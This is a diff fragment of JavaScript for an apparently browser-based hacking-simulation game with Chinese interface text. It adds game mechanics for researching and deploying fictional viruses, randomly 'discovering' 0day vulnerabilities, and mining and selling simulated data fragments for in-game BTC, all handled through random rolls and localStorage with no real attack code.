+            html += '<div style="font-size:9px;color:#666;">研发于 #' + pv.developedRound + '</div>';
+            html += '<button class="quick-btn" style="margin-top:6px;font-size:10px;padding:4px 12px;background:rgba(255,23,68,0.2);border-color:#ff1744;color:#ff1744;" onclick="deployVirusOnAttack(' + idx + ')">⚡ 部署攻击</button>';
+            html += '</div>';
+        });
+        html += '</div>';
+    }
+    html += '</div>';
+    
+    // 活跃病毒
+    html += '<div class="fbi-section">';
+    html += '<div class="fbi-section-title">活跃感染状态</div>';
+    var actives = data.activeViruses || [];
+    if (actives.length === 0) {
+        html += '<p style="color:#006600;font-size:10px;">当前无活跃病毒感染</p>';
+    } else {
+        actives.forEach(function(av) {
+            html += '<div style="font-size:10px;color:#ff6644;padding:4px 0;">🦠 ' + av.virusName + ' → 服务器#' + av.targetServerId + ' (剩余' + av.duration + '回合)</div>';
+        });
+    }
+    html += '</div>';
+    
+    // 病毒研发
+    html += '<div class="fbi-section">';
+    html += '<div class="fbi-section-title">研发新病毒</div>';
+    html += '<table style="width:100%;font-size:10px;color:#ccc;border-collapse:collapse;">';
+    html += '<tr style="color:#00ff41;"><th style="padding:6px;text-align:left;">病毒</th><th>感染率</th><th>破坏力</th><th>隐蔽性</th><th>成本(BTC)</th><th>研发回合</th><th>操作</th></tr>';
+    VIRUS_TYPES.forEach(function(vt) {
+        var already = (data.playerViruses || []).find(function(pv){return pv.virusId === vt.id;});
+        var researching = (data.researchingVirus === vt.id);
+        html += '<tr style="border-bottom:1px solid #1a1a2e;">';
+        html += '<td style="padding:6px;"><b>' + vt.icon + ' ' + vt.name + '</b><br><span style="color:#888;">' + vt.desc + '</span></td>';
+        html += '<td style="text-align:center;color:' + (vt.infectRate>=0.7?'#00ff41':'#ffaa00') + ';">' + Math.round(vt.infectRate*100) + '%</td>';
+        html += '<td style="text-align:center;color:#ff4444;">' + vt.damage + '</td>';
+        html += '<td style="text-align:center;color:#00aaff;">' + Math.round(vt.stealth*100) + '%</td>';
+        html += '<td style="text-align:center;color:#ffaa00;">₿' + vt.devCostBTC.toFixed(3) + '</td>';
+        html += '<td style="text-align:center;">' + vt.devRounds + '</td>';
+        if (already) {
+            html += '<td style="text-align:center;color:#00ff41;">已拥有</td>';
+        } else if (researching) {
+            html += '<td style="text-align:center;color:#ffaa00;">研发中...</td>';
+        } else {
+            html += '<td style="text-align:center;"><button class="quick-btn" style="font-size:9px;padding:3px 8px;" onclick="startVirusResearch(\'' + vt.id + '\')">研发</button></td>';
+        }
+        html += '</tr>';
+    });
+    html += '</table>';
+    
+    if (data.researchingVirus) {
+        var rv = VIRUS_TYPES.find(function(v){return v.id === data.researchingVirus;});
+        html += '<div style="margin-top:10px;font-size:10px;color:#ffaa00;">⏳ 正在研发: ' + (rv?rv.name:data.researchingVirus) + ' | 剩余 ' + (data.virusResearchRounds || 0) + ' 回合</div>';
+    }
+    html += '</div>';
+
+    // === 病毒商店：即时购买（溢价） ===
+    html += '<div class="fbi-section">';
+    html += '<div class="fbi-section-title">💰 病毒商店（即时购买，无需等待回合）</div>';
+    html += '<p style="font-size:9px;color:#888;">暗网售卖碎片所得的BTC可在此购买病毒。价格含100%溢价，但无需研发回合。</p>';
+    var shopBtc = getBTCBalance();
+    html += '<div style="font-size:10px;color:#ffaa00;margin:6px 0;">你的BTC余额: ₿' + shopBtc.toFixed(4) + '</div>';
+    html += '<div style="display:flex;flex-wrap:wrap;gap:8px;">';
+    VIRUS_TYPES.forEach(function(vt) {
+        var already = (data.playerViruses || []).find(function(pv){return pv.virusId === vt.id;});
+        var shopPrice = vt.devCostBTC * 2; // 100% 溢价
+        var canBuy = shopBtc >= shopPrice;
+        html += '<div class="zd-card" style="border-color:#ffaa00;min-width:180px;">';
+        html += '<div style="font-size:12px;">' + vt.icon + ' ' + vt.name + '</div>';
+        html += '<div style="font-size:9px;color:#999;">' + vt.desc + '</div>';
+        html += '<div style="font-size:9px;color:#666;">感染率' + Math.round(vt.infectRate*100) + '% | 伤害' + vt.damage + '</div>';
+        html += '<div style="font-size:10px;color:#ffaa00;margin:4px 0;">₿' + shopPrice.toFixed(3) + ' (即时到账)</div>';
+        if (already) {
+            html += '<button class="quick-btn" style="font-size:9px;padding:3px 8px;color:#00ff41;" disabled>已拥有</button>';
+        } else if (!canBuy) {
+            html += '<button class="quick-btn" style="font-size:9px;padding:3px 8px;color:#ff4444;" disabled>BTC不足</button>';
+        } else {
+            html += '<button class="quick-btn" style="font-size:9px;padding:3px 8px;background:rgba(255,170,0,0.2);border-color:#ffaa00;color:#ffaa00;" onclick="buyVirusInstant(\'' + vt.id + '\')">立即购买</button>';
+        }
+        html += '</div>';
+    });
+    html += '</div>';
+    html += '</div>';
+
+    html += '</div>';
+    el.innerHTML = html;
+}
+
+// ====== Phase 3: 病毒研发 ======
+function startVirusResearch(virusId) {
+    var data = loadData();
+    var vt = VIRUS_TYPES.find(function(v){return v.id === virusId;});
+    if (!vt) return;
+    
+    // 检查BTC
+    var investRaw = localStorage.getItem('investSimState_v13');
+    var btc = 0;
+    try {
+        var invSt = JSON.parse(investRaw);
+        var crypto = (invSt.assets || []).find(function(a){return a.id === 'crypto';});
+        btc = crypto ? crypto.holding : 0;
+    } catch(e) {}
+    
+    if (btc < vt.devCostBTC) {
+        alert('BTC不足！需要 ₿' + vt.devCostBTC.toFixed(3) + '，当前 ₿' + btc.toFixed(4));
+        return;
+    }
+    
+    // 扣款
+    try {
+        var invSt2 = JSON.parse(localStorage.getItem('investSimState_v13'));
+        var crypto2 = invSt2.assets.find(function(a){return a.id === 'crypto';});
+        if (crypto2) crypto2.holding -= vt.devCostBTC;
+        localStorage.setItem('investSimState_v13', JSON.stringify(invSt2));
+    } catch(e) {}
+    
+    data.researchingVirus = virusId;
+    data.virusResearchRounds = vt.devRounds;
+    addLog(data, 'system', '🦠 开始研发 ' + vt.name + ' (成本 ₿' + vt.devCostBTC.toFixed(3) + ', 需要 ' + vt.devRounds + ' 回合)');
+    saveData(data);
+    renderVirus(data);
+    renderStats(data);
+}
+
+// ====== Phase 3: 部署病毒 ======
+function deployVirusOnAttack(playerVirusIdx) {
+    var data = loadData();
+    var pv = (data.playerViruses || [])[playerVirusIdx];
+    if (!pv) return;
+    
+    // 设置为"准备部署"状态
+    data.pendingVirus = pv;
+    addLog(data, 'system', '⚡ ' + pv.name + ' 已装填，下次攻击时将自动部署');
+    saveData(data);
+    renderVirus(data);
+    
+    // 切换到服务器群视图
+    switchTabDirect('cluster');
+}
+
+function switchTabDirect(name) {
+    document.querySelectorAll('.tab-btn').forEach(function(b){b.classList.remove('active');});
+    document.querySelectorAll('.tab-content').forEach(function(c){c.classList.remove('active');});
+    var btn = document.querySelector('.tab-btn[onclick*="' + name + '"]');
+    if (btn) btn.classList.add('active');
+    var tab = document.getElementById('tab-' + name);
+    if (tab) tab.classList.add('active');
+    var data = loadData();
+    if (name === 'cluster') renderClusterView(data);
+}
+
+// ====== Phase 3: 攻击时触发病毒部署 ======
+function tryDeployVirus(data, server) {
+    if (!data.pendingVirus) return false;
+    var pv = data.pendingVirus;
+    var vt = VIRUS_TYPES.find(function(v){return v.id === pv.virusId;});
+    if (!vt) return false;
+    
+    // 感染率判定
+    var infectChance = vt.infectRate;
+    // 服务器等级越高越难感染
+    infectChance -= server.level * 0.03;
+    infectChance = Math.max(0.1, infectChance);
+    
+    if (Math.random() < infectChance) {
+        data.activeViruses = data.activeViruses || [];
+        data.activeViruses.push({
+            virusId: pv.virusId,
+            virusName: pv.name,
+            targetServerId: server.id,
+            deployRound: data.currentRound,
+            duration: 3
+        });
+        addLog(data, 'system', '🦠 ' + pv.name + ' 成功感染 ' + server.name + '！(+' + Math.round(vt.damage*0.3) + ' 额外伤害)');
+        termPrint('[🦠] ' + pv.name + ' 感染成功！额外伤害 +' + Math.round(vt.damage*0.3), 'term-warn');
+        data.pendingVirus = null;
+        saveData(data);
+        return true;
+    } else {
+        termPrint('[-] ' + pv.name + ' 感染失败（服务器防御过强）', 'term-err');
+        data.pendingVirus = null;
+        saveData(data);
+        return false;
+    }
+}
+
+// ====== Phase 4: 0day漏洞发现 ======
+function tryZeroDayDiscovery(data, cluster) {
+    if (!cluster) return;
+    
+    // 基础发现概率
+    var baseChance = 0.50;
+    // 世界服务器工具加成
+    try {
+        var raw = localStorage.getItem('investSimState_v13');
+        if (raw) {
+            var st = JSON.parse(raw);
+            var wsTools = st.wsTools || {};
+            baseChance += (wsTools.zeroDayChance || 0) * 0.01;
+        }
+    } catch(e) {}
+    
+    // 已被发现的0day数量越多，发现新0day概率越低
+    var existingCount = (data.zeroDays || []).length;
+    baseChance *= Math.max(0.1, 1 - existingCount * 0.15);
+    
+    if (Math.random() > baseChance) return;
+    
+    // 确定等级
+    var grades = ['Critical', 'High', 'Medium', 'Low'];
+    var weights = [0.1, 0.25, 0.35, 0.3];
+    var totalW = weights.reduce(function(a,b){return a+b;},0);
+    var r = Math.random() * totalW;
+    var cumu = 0;
+    var grade = 'Low';
+    for (var g = 0; g < grades.length; g++) {
+        cumu += weights[g];
+        if (r <= cumu) { grade = grades[g]; break; }
+    }
+    
+    var gInfo = ZERODAY_GRADES[grade];
+    // 生成漏洞名称
+    var targetTypes = Object.keys(ZERODAY_NAMES_BY_TARGET);
+    var targetType = targetTypes[randInt(0, targetTypes.length-1)];
+    var names = ZERODAY_NAMES_BY_TARGET[targetType];
+    var zdName = names[randInt(0, names.length-1)];
+    var cveNum = 'CVE-2026-' + randInt(1000, 99999);
+    
+    var zeroDay = {
+        id: 'zd_' + Date.now() + '_' + randInt(0,9999),
+        cve: cveNum,
+        name: zdName,
+        grade: grade,
+        discoveredRound: data.currentRound,
+        expiryRound: data.currentRound + gInfo.decayRounds,
+        used: false,
+        sold: false,
+        targetType: targetType,
+        successBonus: gInfo.successBonus,
+        valueBTC: gInfo.valueBase * (0.8 + Math.random() * 0.4)
+    };
+    
+    data.zeroDays.push(zeroDay);
+    addLog(data, 'system', '💎 发现0day漏洞！' + zdName + ' [' + grade + '] ' + cveNum + ' (有效期 ' + gInfo.decayRounds + ' 回合)');
+    termPrint('', 'term-out');
+    termPrint('[💎] *** 0DAY VULNERABILITY DISCOVERED! ***', 'term-ok');
+    termPrint('[💎] ' + zeroDay.cve + ' - ' + zeroDay.name, 'term-ok');
+    termPrint('[💎] Grade: ' + grade + ' | Success Bonus: +' + gInfo.successBonus + '%', 'term-ok');
+    termPrint('[💎] Market Value: ₿' + zeroDay.valueBTC.toFixed(4), 'term-ok');
+    termPrint('[💎] Expires in ' + gInfo.decayRounds + ' rounds', 'term-warn');
+    saveData(data);
+}
+
+// ====== Phase 4: 0day漏洞渲染 ======
+function renderZeroDay(data) {
+    var el = document.getElementById('tab-zeroday');
+    if (!el) return;
+    
+    var html = '<div class="zeroday-panel">';
+    html += '<h3>💎 0day漏洞库</h3>';
+    
+    // 已发现的0day
+    html += '<div class="fbi-section">';
+    html += '<div class="fbi-section-title">已发现的0day漏洞</div>';
+    var zeroDays = data.zeroDays || [];
+    var active = zeroDays.filter(function(zd){return !zd.used && !zd.sold && zd.expiryRound > data.currentRound;});
+    var expired = zeroDays.filter(function(zd){return zd.expiryRound <= data.currentRound && !zd.used && !zd.sold;});
+    var used = zeroDays.filter(function(zd){return zd.used || zd.sold;});
+    
+    if (active.length === 0 && expired.length === 0 && used.length === 0) {
+        html += '<p style="color:#006600;font-size:10px;">尚未发现任何0day漏洞。对服务器群执行 nmap 扫描时有概率发现。</p>';
+    }
+    
+    // 活跃0day
+    if (active.length > 0) {
+        html += '<div style="font-size:11px;color:#00ff41;margin-bottom:8px;">可用漏洞 (' + active.length + '个)</div>';
+        html += '<div style="display:flex;flex-wrap:wrap;gap:8px;">';
+        active.forEach(function(zd) {
+            var gInfo = ZERODAY_GRADES[zd.grade] || {};
+            var remaining = zd.expiryRound - data.currentRound;
+            html += '<div class="zd-card" style="border-color:' + gInfo.color + ';min-width:200px;">';
+            html += '<div style="font-size:13px;color:' + gInfo.color + ';font-weight:bold;">' + zd.name + '</div>';
+            html += '<div style="font-size:9px;color:#999;">' + zd.cve + ' | ' + zd.targetType + '</div>';
+            html += '<div style="font-size:10px;">等级: <span style="color:' + gInfo.color + ';">' + zd.grade + '</span> | 成功率 +' + zd.successBonus + '%</div>';
+            html += '<div style="font-size:10px;">价值: ₿' + zd.valueBTC.toFixed(4) + ' | 剩余 ' + remaining + ' 回合</div>';
+            html += '<div style="font-size:9px;color:#666;">发现于 #' + zd.discoveredRound + ' | 过期于 #' + zd.expiryRound + '</div>';
+            html += '</div>';
+        });
+        html += '</div>';
+    }
+    
+    // 已过期
+    if (expired.length > 0) {
+        html += '<div style="font-size:11px;color:#ff4444;margin:12px 0 4px;">已过期漏洞 (' + expired.length + '个)</div>';
+        expired.forEach(function(zd) {
+            html += '<div style="font-size:9px;color:#ff6666;">' + zd.name + ' (' + zd.grade + ') - 已被厂商修补</div>';
+        });
+    }
+    
+    // 已使用/已出售
+    if (used.length > 0) {
+        html += '<div style="font-size:11px;color:#888;margin:12px 0 4px;">已处理 (' + used.length + '个)</div>';
+        used.forEach(function(zd) {
+            var status = zd.sold ? '已出售' : '已使用';
+            html += '<div style="font-size:9px;color:#888;">' + zd.name + ' (' + zd.grade + ') - ' + status + '</div>';
+        });
+    }
+    html += '</div>';
+    
+    // 发现概率说明
+    html += '<div class="fbi-section">';
+    html += '<div class="fbi-section-title">发现机制</div>';
+    html += '<p style="font-size:10px;color:#008800;">每次 nmap 扫描服务器群时，有基础 50% 概率发现 0day 漏洞。</p>';
+    html += '<p style="font-size:10px;color:#006600;">已发现 0day 数量越多，发现新 0day 概率越低（每个递减15%）。</p>';
+    html += '<p style="font-size:10px;color:#006600;">0day 有效期到期后自动失效（被厂商修补）。</p>';
+    html += '</div>';
+    
+    html += '</div>';
+    el.innerHTML = html;
+}
+
+// ====== Phase 4: 攻击时使用0day（已集成到 calcSuccessRate） ======
+// 攻击成功后标记0day为已使用
+function consumeZeroDayOnSuccess(data) {
+    var unusedZeroDays = (data.zeroDays || []).filter(function(zd){ return !zd.used && !zd.sold && zd.expiryRound > (data.currentRound || 0); });
+    if (unusedZeroDays.length > 0) {
+        var best = unusedZeroDays[0];
+        var gOrder = {Critical:4, High:3, Medium:2, Low:1};
+        for (var z = 1; z < unusedZeroDays.length; z++) {
+            if ((gOrder[unusedZeroDays[z].grade] || 0) > (gOrder[best.grade] || 0)) best = unusedZeroDays[z];
+        }
+        // 0day使用后有50%概率被发现/修复（不再可用）
+        if (Math.random() < 0.5) {
+            best.used = true;
+            addLog(data, 'system', '💎 0day ' + best.name + ' 已被使用并暴露，漏洞失效');
+        }
+    }
+}
+
+// ====== Phase 5: 黑市工具在攻击中的消耗 ======
+function consumeHackToolOnAttack(toolType) {
+    try {
+        var raw = localStorage.getItem('investSimState_v13');
+        if (!raw) return;
+        var st = JSON.parse(raw);
+        var tools = st.hackTools || [];
+        var found = tools.find(function(t){return t.id === toolType && t.usesLeft > 0;});
+        if (found) {
+            found.usesLeft--;
+            if (found.usesLeft <= 0) {
+                // 移除耗尽工具
+                st.hackTools = tools.filter(function(t){return t.id !== toolType || t.usesLeft > 0;});
+            }
+            localStorage.setItem('investSimState_v13', JSON.stringify(st));
+        }
+    } catch(e) {}
+}
+
+// ====== 辅助：消费任意一个持有工具 ======
+function consumeAnyHackTool() {
+    try {
+        var raw = localStorage.getItem('investSimState_v13');
+        if (!raw) return;
+        var st = JSON.parse(raw);
+        var tools = (st.hackTools || []).filter(function(t) { return t.usesLeft > 0; });
+        if (tools.length === 0) return;
+        var pick = tools[Math.floor(Math.random() * tools.length)];
+        pick.usesLeft--;
+        var idx = st.hackTools.findIndex(function(t) { return t.id === pick.id; });
+        if (idx >= 0) {
+            if (pick.usesLeft <= 0) {
+                st.hackTools.splice(idx, 1);
+            } else {
+                st.hackTools[idx].usesLeft = pick.usesLeft;
+            }
+        }
+        localStorage.setItem('investSimState_v13', JSON.stringify(st));
+    } catch(e) {}
+}
+
+// ====== 修改攻击成功后的处理（hook到cmdExploitReal等函数） ======
+// 注：以下通过重写方式确保每次攻击成功后触发病毒部署和0day消耗
+var _origMarkServerBroken = markServerBroken;
+if (typeof markServerBroken === 'function') {
+    markServerBroken = function(data, server, cluster) {
+        // 病毒部署
+        if (data.pendingVirus) tryDeployVirus(data, server);
+        // 0day消耗
+        consumeZeroDayOnSuccess(data);
+        // 工具消耗：消耗所有持有工具中随机1个
+        consumeAnyHackTool();
+        // 原函数
+        _origMarkServerBroken(data, server, cluster);
+    };
+}
+
+// ====== 闭环功能：自动挖掘碎片系统 ======
+
+// Fragment grade table: price in BTC per fragment
+var FRAGMENT_GRADE_PRICES = { S: 0.5, A: 0.3, B: 0.15, C: 0.06, D: 0.02 };
+var FRAGMENT_GRADE_NAMES = { S: '绝密', A: '机密', B: '核心', C: '普通', D: '基础' };
+var FRAGMENT_GRADE_WEIGHTS = { S: 0.05, A: 0.12, B: 0.22, C: 0.3, D: 0.31 };
+
+// DARKNET_PENDING_FRAGMENTS 中转 Key
+var DARKNET_PENDING_KEY = 'darknetPendingFragments_v13';
+
+/**
+ * 扫描所有已攻破的服务器，返回可挖掘的碎片列表
+ */
+function scanBrokenServers(data) {
+    var broken = [];
+    data.clusters.forEach(function(c) {
+        c.servers.forEach(function(s) {
+            if (s.isBroken && !s._minedThisSession) {
+                broken.push({ server: s, cluster: c });
+            }
+        });
+    });
+    return broken;
+}
+
+/**
+ * 为服务器生成随机等级碎片
+ */
+function generateMineFragment(server, cluster, data) {
+    var tier = 'C';
+    var roll = Math.random();
+    if (roll < FRAGMENT_GRADE_WEIGHTS.S) tier = 'S';
+    else if (roll < FRAGMENT_GRADE_WEIGHTS.S + FRAGMENT_GRADE_WEIGHTS.A) tier = 'A';
+    else if (roll < FRAGMENT_GRADE_WEIGHTS.S + FRAGMENT_GRADE_WEIGHTS.A + FRAGMENT_GRADE_WEIGHTS.B) tier = 'B';
+    else if (roll < FRAGMENT_GRADE_WEIGHTS.S + FRAGMENT_GRADE_WEIGHTS.A + FRAGMENT_GRADE_WEIGHTS.B + FRAGMENT_GRADE_WEIGHTS.C) tier = 'C';
+    else tier = 'D';
+
+    var serverLevelBonus = Math.min(server.level * 0.03, 0.15);
+    if (tier === 'D' && Math.random() < serverLevelBonus) tier = 'C';
+    if (tier === 'C' && Math.random() < serverLevelBonus) tier = 'B';
+
+    return {
+        id: 'frag_' + Date.now() + '_' + Math.floor(Math.random() * 10000),
+        grade: tier,
+        gradeName: FRAGMENT_GRADE_NAMES[tier],
+        valueBTC: FRAGMENT_GRADE_PRICES[tier],
+        serverName: server.name,
+        serverIP: server.ip,
+        clusterName: cluster.name,
+        clusterTheme: cluster.theme,
+        dataType: FRAGMENT_TYPE_MAP[cluster.name] || '未知数据',
+        minedAtRound: data.currentRound,
+        minedAtTime: now()
+    };
+}
+
+/**
+ * 渲染自动挖掘面板
+ */
+function renderAutoMine(data) {
+    var el = document.getElementById('automineView');
+    if (!el) return;
+    var ms = data.mineState || { active: false, progress: 0, total: 0, results: [] };
+    var broken = scanBrokenServers(data);
+    var pendingCount = broken.length;
+
+    var html = '<div class="automine-panel">';
+    html += '<h3>⛏️ 自动碎片挖掘系统</h3>';
+    html += '<p style="font-size:10px;color:#888;">对所有已攻破的服务器进行深度数据提取，自动挖掘有价值的数据碎片。</p>';
+    html += '<div style="margin:8px 0;font-size:10px;">';
+    html += '已攻破服务器: <b style="color:#00ff41;">' + data.player.ownedServers + '</b> | ';
+    html += '可挖掘: <b style="color:#ffaa00;">' + pendingCount + '</b> | ';
+    html += '本轮已挖: <b style="color:#ff9100;">' + (ms.results ? ms.results.length : 0) + '</b>';
+    html += '</div>';
+
+    // Progress bar
+    if (ms.active && ms.total > 0) {
+        var pct = Math.round(ms.progress / ms.total * 100);
+        html += '<div class="progress-bar-wrap">';
+        html += '<div class="progress-bar-fill" style="width:' + pct + '%;"></div>';
+        html += '</div>';
+        html += '<div class="progress-text">挖掘中... ' + ms.progress + ' / ' + ms.total + ' (' + pct + '%)</div>';
+    }
+
+    // Buttons
+    html += '<div style="margin:10px 0;">';
+    var mineDisabled = ms.active || pendingCount === 0 ? ' disabled' : '';
+    html += '<button class="btn-mine" onclick="startAutoMining()"' + mineDisabled + '>⛏️ 开始自动挖掘</button> ';
+    if (ms.active) {
+        html += '<button class="btn-mine stop" onclick="stopAutoMining()">⏹ 停止挖掘</button> ';
+    }
+    html += '<button class="btn-mine" onclick="uploadFragmentsToDarknet()"';
+    if (!ms.results || ms.results.length === 0) html += ' disabled';
+    html += '>📤 一键上架暗网 (' + (ms.results ? ms.results.length : 0) + '个碎片)</button>';
+    html += '</div>';
+
+    // Results table
+    if (ms.results && ms.results.length > 0) {
+        html += '<h3 style="font-size:12px;color:#00ff41;margin-top:12px;">📋 本轮挖掘收获</h3>';
+        var summary = { S: 0, A: 0, B: 0, C: 0, D: 0 };
+        var totalBTC = 0;
+        ms.results.forEach(function(r) { summary[r.grade]++; totalBTC += r.valueBTC; });
+
+        html += '<div style="font-size:10px;margin:6px 0;">';
+        var grades = ['S','A','B','C','D'];
+        var gradeColors = {S:'#ff1744',A:'#ff9100',B:'#ffea00',C:'#76ff03',D:'#00aaff'};
+        grades.forEach(function(g) {
+            if (summary[g] > 0) html += '<span class="grade-' + g + '" style="margin-right:12px;">' + FRAGMENT_GRADE_NAMES[g] + ': ' + summary[g] + '</span>';
+        });
+        html += ' <b style="color:#ffaa00;">总价值 ₿' + totalBTC.toFixed(3) + '</b>';
+        html += '</div>';
+
+        html += '<table class="mine-result-table">';
+        html += '<tr><th>碎片ID</th><th>等级</th><th>类型</th><th>来源</th><th>服务器</th><th>价值</th></tr>';
+        var showResults = ms.results.slice(-20);
+        showResults.forEach(function(r) {
+            html += '<tr>';
+            html += '<td style="font-size:8px;color:#666;">' + r.id.slice(-8) + '</td>';
+            html += '<td class="grade-' + r.grade + '">' + r.gradeName + '</td>';
+            html += '<td>' + r.dataType + '</td>';
+            html += '<td style="color:#888;">' + r.clusterName + '</td>';
+            html += '<td style="color:#888;">' + r.serverName + '</td>';
+            html += '<td style="color:#ffaa00;">₿' + r.valueBTC.toFixed(3) + '</td>';
+            html += '</tr>';
+        });
+        if (ms.results.length > 20) {
+            html += '<tr><td colspan="6" style="text-align:center;color:#666;">... 以及 ' + (ms.results.length - 20) + ' 个更早的碎片</td></tr>';
+        }
+        html += '</table>';
+    } else if (!ms.active) {
+        html += '<div style="color:#003300;font-size:10px;margin-top:12px;">暂无挖掘结果。点击「开始自动挖掘」扫描已攻破服务器。</div>';
+    }
+
+    html += '</div>';
+    el.innerHTML = html;
+
+    // Auto-refresh if active
+    if (ms.active) {
+        setTimeout(function() { renderAutoMine(loadData()); }, 600);
+    }
+}
+
+/**
+ * 开始自动挖掘
+ */
+function startAutoMining() {
+    var data = loadData();
+    var ms = data.mineState;
+    var broken = scanBrokenServers(data);
+
+    if (broken.length === 0) {
+        alert('没有可挖掘的服务器！请先攻破更多服务器。');
+        return;
+    }
+
+    ms.active = true;
+    ms.progress = 0;
+    ms.total = broken.length;
+    if (!ms.results) ms.results = [];
+    saveData(data);
+
+    addLog(data, 'system', '⛏️ 开始自动挖掘 ' + broken.length + ' 台服务器...');
+    renderAutoMine(data);
+
+    // Animated mining: process servers one by one
+    function mineNext() {
+        var d = loadData();
+        var m = d.mineState;
+        if (!m.active || m.progress >= m.total) {
+            m.active = false;
+            addLog(d, 'system', '⛏️ 自动挖掘完成！共获得 ' + (m.results ? m.results.length : 0) + ' 个碎片');
+            saveData(d);
+            renderAutoMine(d);
+            renderStats(d);
+            return;
+        }
+
+        // Get fresh scan (some servers may have been repaired)
+        var currentBroken = scanBrokenServers(d);
+        if (m.progress < currentBroken.length) {
+            var target = currentBroken[m.progress];
+            var fragment = generateMineFragment(target.server, target.cluster, d);
+            if (!m.results) m.results = [];
+            m.results.push(fragment);
+            target.server._minedThisSession = true;
+        }
+
+        m.progress++;
+        saveData(d);
+        renderAutoMine(d);
+
+        if (m.active) {
+            var delay = 80 + Math.random() * 160;
+            setTimeout(mineNext, delay);
+        }
+    }
+
+    setTimeout(mineNext, 200);
+}
+
+/**
+ * 停止自动挖掘
+ */
+function stopAutoMining() {
+    var data = loadData();
+    data.mineState.active = false;
+    addLog(data, 'system', '⛏️ 自动挖掘已停止（进度 ' + data.mineState.progress + '/' + data.mineState.total + '）');
+    saveData(data);
+    renderAutoMine(data);
+}
+
+/**
+ * 一键上架暗网：将本轮碎片写入 localStorage，供 darknet-market.html 读取
+ */
+function uploadFragmentsToDarknet() {
+    var data = loadData();
+    var ms = data.mineState;
+    if (!ms.results || ms.results.length === 0) {
+        alert('本轮没有挖掘到碎片！');
+        return;
+    }
+
+    // Serialize fragments to localStorage
+    try {
+        var existing = JSON.parse(localStorage.getItem(DARKNET_PENDING_KEY) || '[]');
+        if (!Array.isArray(existing)) existing = [];
+        var count = ms.results.length;
+        existing = existing.concat(ms.results);
+        localStorage.setItem(DARKNET_PENDING_KEY, JSON.stringify(existing));
+
+        addLog(data, 'system', '📤 已将 ' + count + ' 个碎片上架至暗网（总计 ₿' + ms.results.reduce(function(s,r){return s+r.valueBTC;},0).toFixed(3) + '）');
+        ms.results = [];
+        saveData(data);
+        renderAutoMine(data);
+        renderStats(data);
+
+        alert('已成功上架 ' + count + ' 个碎片到暗网市场！\n请在 darknet-market.html → 出售 → 自动挖掘碎片出售 中完成售卖。');
+    } catch(e) {
+        alert('上架失败：' + e.message);
+    }
+}
+
+// ====== BTC 余额读取 ======
+function getBTCBalance() {
+    try {
+        var invSt = JSON.parse(localStorage.getItem('investSimState_v13'));
+        if (!invSt || !invSt.assets) return 0;
+        var crypto = invSt.assets.find(function(a){return a.id === 'crypto';});
+        return crypto ? (crypto.holding || 0) : 0;
+    } catch(e) { return 0; }
+}
+
+/**
+ * 从 investSimState_v13 扣减 BTC
+ */
+function deductBTC(amount) {
+    try {
+        var invSt = JSON.parse(localStorage.getItem('investSimState_v13'));
+        if (!invSt || !invSt.assets) return false;
+        var crypto = invSt.assets.find(function(a){return a.id === 'crypto';});
+        if (!crypto || crypto.holding < amount) return false;
+        crypto.holding -= amount;
+        localStorage.setItem('investSimState_v13', JSON.stringify(invSt));
+        return true;
+    } catch(e) { return false; }
+}
+
+// ====== 病毒商店：即时购买 ======
+function buyVirusInstant(virusId) {
+    var vt = VIRUS_TYPES.find(function(v){return v.id === virusId;});
+    if (!vt) return;
+    var data = loadData();
+    if (!data.playerViruses) data.playerViruses = [];
+
+    var already = data.playerViruses.find(function(pv){return pv.virusId === vt.id;});
+    if (already) { alert('已经拥有此病毒！'); return; }
+
+    var shopPrice = vt.devCostBTC * 2; // 100% 溢价
+    var btc = getBTCBalance();
+    if (btc < shopPrice) { alert('BTC不足！需要 ₿' + shopPrice.toFixed(3) + '，当前 ₿' + btc.toFixed(4)); return; }
+
+    if (!deductBTC(shopPrice)) { alert('扣款失败！'); return; }
+
+    data.playerViruses.push({
+        virusId: vt.id,
+        icon: vt.icon,
+        name: vt.name,
+        infectRate: vt.infectRate,
+        damage: vt.damage,
+        stealth: vt.stealth,
+        acquiredAt: now(),
+        acquiredMethod: 'store'
+    });
+    addLog(data, 'system', '🛒 从病毒商店购买 ' + vt.name + ' (花费 ₿' + shopPrice.toFixed(3) + ')');
+    saveData(data);
+    renderVirus(data);
+    renderStats(data);
+    alert('购买成功！' + vt.icon + ' ' + vt.name + ' 已入库，攻击时可部署。');
+}
+
+</script>
+</body>
+</html>
